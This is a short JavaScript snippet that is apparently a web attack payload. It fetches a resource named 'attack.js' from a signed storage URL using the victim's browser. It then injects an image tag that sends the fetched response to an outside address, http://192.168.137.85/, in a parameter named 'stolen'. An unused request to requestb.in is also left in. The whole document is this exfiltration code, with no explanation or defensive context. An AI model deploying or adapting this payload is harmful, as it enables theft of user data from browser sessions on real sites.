var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://00e9e64bac33a56936d1fb09a351b8dc1a403f5b1c4c9d2901-apidata.googleusercontent.com/download/storage/v1_internal/b/web-317/o/attack.js?qk=AD5uMEt_sLNyjok-GCxmClseRhyPCD-5piHU9UoTrNSWM1D5C2w3CNHPWyFnbZ89rqBBXcG6IzPGqQcUIagIiAMW2dq0fH97z0pHaCQKOyQ56ehF_SlIKnNTfIWoLZoAFOWVeKMu1_2y0JCqyB2H0cgi8QMx5fT514V2lN2kLWrO7LIAyXKCXhlcc8nI7MgSLHK_pf4mngcC-ItcjBqFIzAGYBRcb4NlS3btwn1MaYnOZm307seOMLbJEfBryjTQX6QswGyV-89b7jBuPfiov2ewV5ml9tCm1DweP8iA9r09X9sBrBMNuWzOIWZ4g8a57U4rdsE2opHbabrj57TTbTLlcNn1cUCGwxuyxAx1XNiBtwAChp5Kh88BvGajLBaMB0XxJTXDG8SRj9B-IyKy38uWr9uZvI2htfYLTO9vX9-DkopME-2XAYU3mVqxsFBFyW0Vtub-UlAOhHMLZ2GCllkWujZRwi3JP4rElQf4FraKh1SSRWGSWznCve2R9YajHaMZ0Jt1inButXYl1ZY8kgKRGiLz1YGDwZsRbLyGvDEz3RZutCEfwFfCpOw5tmTTU0fdR7qQ33Zm1FAb27vLTNLqYg72hI1ExeJeYmLuF5TiMT7toN_eZNNUwU1XlxwwEgRnyIIHcv-IBTxpTFeGV_smieE1JgpABsoueHqwK2OSg8B_zDRzfsUJq5BKl0CYLtF9KDS4sOk9jyAkLwZAVMQtK98AbHziDBDsmbUGFyA6WmRnrCKtEAFT16dIuKRZfMASxX0ba02DT3MI8yJVyiQ8xEeu9ijFNCo6Ja0FF8naYfTRjaLz1_g', false);
xhr.send();
if (xhr.status != 200) {
  alert( xhr.status + ': ' + xhr.statusText ); 
} else {
	xhr.open('POST', 'http://requestb.in', false);
	document.write("<img src='http://192.168.137.85/?stolen="+xhr.responseText+"'>");
}